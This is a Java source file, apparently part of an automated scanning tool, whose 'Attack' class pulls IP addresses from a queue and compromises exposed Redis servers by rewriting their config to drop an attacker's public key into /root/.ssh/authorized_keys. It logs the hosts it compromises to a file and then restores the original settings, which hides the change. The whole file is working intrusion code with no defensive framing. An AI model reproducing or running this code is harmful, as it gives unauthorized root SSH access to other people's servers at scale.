package com.yk.service.impl;

import com.alibaba.fastjson.JSONObject;
import com.yk.commons.constant.Cmd;
import com.yk.core.Engine;
import com.yk.util.CommandExecUtil;
import com.yk.util.ReadFromFile;
import com.yk.util.Util;

import java.util.HashMap;
import java.util.Map;

public class Attack implements Runnable {

    @Override
    public void run() {
        String dirFileName=null;
        String dbfileName=null;
        boolean rdbcompression=false;
        String ip = Engine.routeQueue.poll();
        try {
            System.out.println("0======{}===================>");
            String result = CommandExecUtil.linkRedis(ip, "config get dir");
            dirFileName = Util.formString(result);
            System.out.println(dirFileName);
            result = CommandExecUtil.linkRedis(ip, "config get dbfilename");
            dbfileName = Util.formString(result);
            System.out.println(dbfileName);
            result = CommandExecUtil.linkRedis(ip, "config get rdbcompression");
            rdbcompression = "yes".equals(Util.formString(result));
            System.out.println(rdbcompression);
            result = CommandExecUtil.linkRedis(ip, "config set dir " + Cmd.sshUrl);
            boolean addSSH = "ok".equals(result.trim().replaceAll("\n", "").toLowerCase());
            System.out.println(addSSH);
            result = CommandExecUtil.linkRedis(ip, "config get dir");
            boolean checkAddSSH = "/root/.ssh".equals(Util.formString(result));
            System.out.println(checkAddSSH);
            result = CommandExecUtil.linkRedis(ip, "config set dbfilename authorized_keys");
            boolean checkSetWantWriteFileName = "ok".equals(result.trim().toLowerCase());
            System.out.println(checkSetWantWriteFileName);
            result = CommandExecUtil.linkRedis(ip, "set abcd \"" + Cmd.publicKey + "\"");
            boolean checkSetAbcd = "ok".equals(result.trim().toLowerCase());
            System.out.println(checkSetAbcd);
            result = CommandExecUtil.linkRedis(ip, "save");
            boolean checksave = "ok".equals(result.trim().toLowerCase());
            if(checksave){
                Map<String,String> map=new HashMap<>();
                map.put("ip",ip);
                map.put("dbfileName",dbfileName);
                map.put("dirFileName",dirFileName);
                String json= JSONObject.toJSONString(map);
                ReadFromFile.WriteStringToFile("./target-server.db",json);
            }
        }catch (Exception e){

        }finally {
            try {
                if (dirFileName != null) {
                    CommandExecUtil.linkRedis(ip, "set dir " + "\"" + dirFileName + "\"");
                }
                if (dbfileName != null) {
                    CommandExecUtil.linkRedis(ip, "config set dbfilename " + "\"" + dbfileName + "\"");
                }
                if (rdbcompression) {
                    CommandExecUtil.linkRedis(ip, "config set rdbcompression no");
                }
                CommandExecUtil.linkRedis(ip, "DEL abcd");
            }catch (Exception e){

            }
        }
    }
}
